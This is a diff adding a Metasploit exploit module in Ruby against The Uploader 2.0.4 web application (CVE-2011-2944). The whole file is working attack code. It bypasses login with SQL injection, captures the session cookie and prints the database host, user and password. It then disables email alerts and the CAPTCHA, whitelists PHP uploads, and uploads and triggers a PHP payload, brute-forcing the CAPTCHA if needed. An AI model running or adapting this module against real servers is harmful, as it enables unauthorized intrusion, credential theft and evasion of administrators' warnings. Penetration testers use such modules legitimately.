@@ -1,0 +1,452 @@
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'				=> 'The Uploader 2.0.4 (Eng/Ita) Remote File Upload',
+			'Description'=> %q{
+					This module exploits various flaws in The Uploader to upload a PHP payload
+					to target system. When run with defaults it will search possible URIs for
+					the application and exploit it automatically. Works against both English
+					and Italian language versions. Notably it disables pre-emptive email warnings
+					before uploading the payload, though it leaves log cleanup as a
+					post-exploitation task.
+			},
+			'Author'			=> [ 'Danny Moules' ],
+			'References'     	=>
+				[
+					[ 'URL', 'http://sourceforge.net/projects/theuploader' ],
+					[ 'CVE', '2011-2944' ],
+				],
+			'Privileged'		=> false,
+			'Payload'        	=>
+				{
+					'DisableNops'	=> true,
+					'Keys'        => ['php'],
+				},
+			'License'			=> MSF_LICENSE,
+			'Platform'			=> 'php',
+			'Arch'				=> ARCH_PHP,
+			'Targets'			=> [[ 'Automatic', { }]],
+			'DefaultTarget' 	=> 0,
+			'DisclosureDate' 	=> 'Feb 23 2012',
+		))
+
+		register_options([
+			Opt::RHOST,
+			Opt::RPORT(80),
+			OptString.new(
+				'URI',
+				[ true, 'Path of application root (default will try common targets)', '/' ]
+			),
+			OptInt.new(
+				'CRACKATTEMPTS',
+				[ true, 'Brute force attempts, if required, to crack CAPTCHA', 200 ]
+			),
+			OptBool.new(
+				'VERBOSE',
+				[ true, 'Verbose output', true ]
+			),
+		], self.class)
+	end
+
+	def get_strings(lang)
+		if lang == "Eng"
+			strings = {
+				"sqlisuccess" => /Log-In has been done successfully/,
+				"whitelistsuccess" => /The extension has been added successfully/,
+				"disablemailsuccess" => /Notification Mail section has been saved successfully/,
+				"changedirsuccess" => /Edit Upload Folder section has been saved successfully/,
+				"captcharequired" => /No result entered/,
+				"uploadsuccess" => /Download Link/,
+				"disablecaptchasuccess" =>
+					/Upload Permissions section has been saved successfully/,
+			}
+		elsif lang == "Ita"
+			strings = {
+				"sqlisuccess" => /stato effettuato con successo/,
+				"whitelistsuccess" => /L'estensione &egrave; stata consentita con successo/,
+				"disablemailsuccess" => /Mail di Notifica &egrave; stata salvata con successo/,
+				"changedirsuccess" =>
+					/Modifica Cartella Upload &egrave; stata salvata con successo/,
+				"captcharequired" => /Non &agrave; stato inserito nessun risultato/,
+				"uploadsuccess" => /Link al download/,
+				"disablecaptchasuccess" => /Permessi Upload &egrave; stata salvata con successo/,
+			}
+		end
+		return strings
+	end
+
+	def exploit
+		#Analyse target
+		analysis = analyse(datastore['URI'])
+		print_status(analysis['status'])
+		strings = get_strings(analysis['lang'])
+		unless analysis['uri'].nil?
+			datastore['URI'] = analysis['uri']
+		end
+
+		#Attempt SQLi - Gets the 'first' valid admin account
+		data = "username=' OR activated=1-- a"
+		data << "&password=a"
+		data << "&login=Log-IN"
+
+		res = send_and_verify(
+			datastore['URI'] + "login.php",
+			"POST",
+			"application/x-www-form-urlencoded",
+			"",
+			data,
+			"SQL injection",
+			strings['sqlisuccess']
+		)
+
+		#Get cookies
+		unless res.headers.include?('Set-Cookie')
+			raise RuntimeError.new("Nobody gave us a cookie =( SQLi failed")
+		end
+		choc_chip = res.headers['Set-Cookie']
+		if datastore["VERBOSE"]
+			print_good("I stole the cookie from the cookie jar: #{choc_chip}")
+		end
+
+		#Optionally, analyse configuration
+		if datastore["VERBOSE"]
+			begin
+				config = analyse_config(strings, choc_chip)
+				print_status("INFO: Database host is #{config['db_host']}")
+				print_status("INFO: Database username is #{config['db_user']}")
+				print_status("INFO: Database password is #{config['db_pass']}")
+				print_status("INFO: Database name is #{config['db_name']}")
+				print_status("INFO: Admin log is #{config['admin_log']}")
+			rescue ::Exception => e
+				err = "Non-fatal error. Failed to analyse configuration: "
+				err << "#{e.class.to_s} #{e.to_s}"
+				print_error(err)
+			end
+		end
+
+		#Whitelist .php extensions for upload
+		res = send_and_verify(
+			datastore['URI'] + "admin/ajaxmanager.php?section=upload&category=extensionadd",
+			"POST",
+			"application/x-www-form-urlencoded",
+			choc_chip,
+			"allowed_ext=php",
+			"Whitelisting .php extensions",
+			strings['whitelistsuccess']
+		)
+
+		# Disable email reporting
+		res = send_and_verify(
+			datastore['URI'] + "admin/ajaxmanager.php?section=upload&category=mail",
+			"POST",
+			"application/x-www-form-urlencoded",
+			choc_chip,
+			"upload_email=0",
+			"Disabling email reporting",
+			strings['disablemailsuccess']
+		)
+
+		# Change upload location to suit us
+		data = "upload_directory="
+		data << "&upload_full="
+		data << datastore['RHOST']
+		data << datastore['URI']
+
+		res = send_and_verify(
+			datastore['URI'] + "admin/ajaxmanager.php?section=upload&category=uploaddir",
+			"POST",
+			"application/x-www-form-urlencoded",
+			choc_chip,
+			data,
+			"Changing upload directory to application root",
+			strings['changedirsuccess']
+		)
+
+		#Disable CAPTCHA on upload (non-fatal)
+		begin
+			res = send_and_verify(
+				datastore['URI'] + "admin/ajaxmanager.php?section=upload&category=captcha",
+				"POST",
+				"application/x-www-form-urlencoded",
+				choc_chip,
+				"captcha_upload=0",
+				"Disabling CAPTCHA on upload",
+				strings['disablecaptchasuccess']
+			)
+		rescue ::Exception
+			print_error("Disabling CAPTCHA on upload failed. Will use cracker if necessary.")
+		end
+
+		#Upload PHP payload
+		upload_uri = "ajax/upload.php"
+		filename = "#{rand_text_alphanumeric(8)}.php"
+		boundary = rand_text_alphanumeric(8)
+		data = %Q{
+--#{boundary}
+Content-Disposition: form-data; name="upfile_1"; filename="#{filename}"
+Content-Type: text/plain
+
+<?php #{payload.encoded} ?>
+--#{boundary}
+		}
+
+		res = send_request_raw({
+			'uri'		=>  datastore['URI'] + upload_uri,
+			'method'	=> 'POST',
+			'data'		=> data + '--',
+			'headers'	=>
+				{
+					'Cookie' 		=> choc_chip,
+					'Content-Type' 		=> 'multipart/form-data; boundary=' + boundary,
+					'Content-Length' 	=> data.length + 2,
+				},
+		}, 20)
+
+		#Verify response
+		if res.code != 200
+			raise RuntimeError.new("Uploading payload failed (HTTP code #{res.code.to_s})")
+		end
+
+		# If failure due to CAPTCHA, crack that...
+		if res.body =~ strings['captcharequired']
+			crack_captcha(data, choc_chip, boundary, upload_uri, strings)
+		else
+			if res.body =~ strings['uploadsuccess']
+				if datastore["VERBOSE"]
+					print_good("Uploading payload succeeded, triggering...")
+				end
+			else
+				err = "Response doesn't look right."
+				err << " Uploading payload probably failed (will continue anyway)"
+				print_error(err)
+			end
+		end
+
+		#Attempt to trigger payload
+		res = send_request_cgi({
+			'uri'		=>  datastore['URI'] + filename,
+			'method'	=> 'GET',
+			'headers'	=>
+				{
+					'Cookie' => choc_chip,
+				},
+		}, 5)
+
+		#Verify response
+		if res and res.code != 200
+			err = "Triggering payload (/#{filename}) failed "
+			err << "(HTTP code #{res.code.to_s})"
+			raise RuntimeError.new(err)
+		else
+			print_good("Triggering payload (/#{filename}) successful")
+		end
+	end
+
+	def crack_captcha(data, choc_chip, boundary, upload_uri, strings)
+		captcha_failed = true
+		print_status("CAPTCHA is enabled. Transforming into brute-force CAPTCHA cracker *ping*")
+
+		crack_data = %Q{
+#{data}
+Content-Disposition: form-data; name="result"
+
+0
+--#{boundary}
+		}
+
+		patience = datastore['CRACKATTEMPTS']
+		for i in (1..patience)
+
+			#First visit index page to trigger CAPTCHA reset
+			res = send_request_cgi({
+			'uri'		=>  datastore['URI'] + "index.php",
+			'method'	=> 'GET',
+			'headers'	=>
+				{
+					'Cookie' => choc_chip
+				},
+			}, 20)
+
+			#Now try CAPTCHA with result 0. It'll happen eventually (1/30ish chance).
+			#Maths-based CAPTCHAs are educational kids!
+			res = send_request_raw({
+				'uri'		=>  datastore['URI'] + upload_uri,
+				'method'	=> 'POST',
+				'data'		=> crack_data + '--',
+				'headers'	=>
+					{
+						'Cookie' 			=> choc_chip,
+						'Content-Type' 		=> 'multipart/form-data; boundary=' + boundary,
+						'Content-Length' 	=> crack_data.length + 2,
+					},
+			}, 20)
+
+			if res.body =~ strings['uploadsuccess']
+				captcha_failed = false
+				break
+			end
+		end
+
+		if captcha_failed
+			err = "Could not break CAPTCHA in #{patience.to_s} iterations."
+			err << " You might have luck retrying."
+			raise RuntimeError.new(err)
+		else
+			print_good("CAPTCHA broken. Transforming back into a mild-mannered exploit *ping*")
+		end
+	end
+
+	def send_and_verify(uri, method, ctype, cookie, data, intent, check)
+		res = send_request_raw({
+			'uri'		=> uri,
+			'method'	=> method,
+			'data'		=> data,
+			'headers'	=>
+				{
+					'Cookie'			=> cookie,
+					'Content-Type'		=> ctype,
+					'Content-Length' 	=> data.length,
+				},
+		}, 20)
+
+		#Verify response
+		if res.code != 200
+			raise RuntimeError.new("#{intent} failed (HTTP code #{res.code.to_s})")
+		end
+		unless res.body =~ check
+			raise RuntimeError.new("Response doesn't look right. #{intent} probably failed")
+		end
+
+		if datastore["VERBOSE"]
+			print_good("#{intent} succeeded")
+		end
+
+		return res
+	end
+
+	def analyse(uri_set)
+		code = nil
+		found_uri = nil
+		status = "Unknown state"
+		lang = "Eng"
+
+		unless uri_set =~ /\/$/ then
+			uri_set = "#{uri_set}/"
+			print_status("URI automatically changed to #{uri_set}")
+		end
+
+		unless uri_set =~ /^\// then
+			uri_set = "/#{uri_set}"
+			print_status("URI automatically changed to #{uri_set}")
+		end
+
+		if uri_set == "/" then
+			uris = [ "/", "/upload/", "/uploader/", "/theuploader/",
+				"/the_uploader/", "/The%20Uploader/",
+				"/The%20Uploader%202.0.4%20-%20Eng/", "/The%20Uploader%202.0.4%20-%20Ita/"
+			]
+		else
+			uris = [ uri_set ]
+		end
+
+		uris.each do |uri|
+			res = send_request_cgi({
+				'uri'		=>  uri + "index.php",
+				'method'	=> 'GET',
+			}, 20)
+
+			if res and res.code == 200
+				if res.body =~ /The Uploader 2\.0/
+					status = "2.0.* version found at #{uri}"
+					code = Exploit::CheckCode::Vulnerable
+					found_uri = uri
+				elsif res.body =~ /The Uploader/
+					status = "Detected unknown version at #{uri}"
+					code = Exploit::CheckCode::Detected
+					found_uri = uri
+				end
+
+				unless found_uri.nil?
+					#Set appropriate language
+					if res.body =~ /Sezione Upload/
+						lang = "Ita"
+					end
+
+					http_fingerprint({ :response => res })
+					break
+				end
+			end
+		end
+
+		if found_uri.nil?
+			if uri_set == "/"
+				status = "Could not find the web site automatically. Enter URI manually?"
+			else
+				status = "Could not find the web site."
+				status << " Use the default URI to search for the web site automatically"
+			end
+			code = Exploit::CheckCode::Safe
+		end
+
+		return { "code" => code, "uri" => found_uri, "lang" => lang, "status" => status }
+	end
+
+	def analyse_config(strings, cookie)
+		#Acquire the database details
+		res = send_request_cgi({
+			'uri'		=>  datastore['URI'] + "admin.php?section=upload&category=server",
+			'method'	=> 'GET',
+			'headers'	=>
+				{
+					'Cookie'	=> cookie
+				},
+		}, 20)
+		unless res and res.code == 200
+			raise RuntimeError.new("Acquiring database details failed")
+		end
+		r = /<input[^>]*name="host"[^>]*value="([^"]*)".*\/>/
+		db_host = r.match(res.body)[1]
+		r = /<input[^>]*name="user"[^>]*value="([^"]*)".*\/>/
+		db_user = r.match(res.body)[1]
+		r = /<input[^>]*name="pass"[^>]*value="([^"]*)".*\/>/
+		db_pass = r.match(res.body)[1]
+		r = /<input[^>]*name="dbnm"[^>]*value="([^"]*)".*\/>/
+		db_name = r.match(res.body)[1]
+
+		#Acquire the admin log details
+		res = send_request_cgi({
+			'uri'		=>  datastore['URI'] + "admin.php?section=admin&category=admin_log",
+			'method'	=> 'GET',
+			'headers'	=>
+				{
+					'Cookie'	=> cookie
+				},
+		}, 20)
+		unless res and res.code == 200
+			raise RuntimeError.new("Acquiring admin log details failed")
+		end
+		r = /<input[^>]*name="admin_log"[^>]*checked.*\/>/
+		if r.match(res.body)
+			admin_log = "active"
+		else
+			admin_log = "inactive"
+		end
+
+		return {
+			"db_host" => db_host, "db_user" => db_user, "db_pass" => db_pass,
+			"db_name" => db_name, "admin_log" => admin_log,
+		}
+	end
+
+	def check
+		analysis = analyse("/")
+		print_status(analysis['status'])
+		return analysis['code']
+	end
+end
